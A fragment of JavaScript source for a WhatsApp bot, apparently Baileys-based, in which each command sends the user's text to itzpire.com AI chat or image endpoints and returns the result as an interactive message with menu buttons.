                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
        case 'diffusion-anime': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/animediff2?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Diffusion Anime AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: gpt.result} }, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'bingai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/bing-ai?model=Balanced&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Bing AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'blackboxai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'costume-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Costume AI\n\n${gpt.data.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'herc-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-chat?model=v3&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercaiv1': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI V1\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-cartoon': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
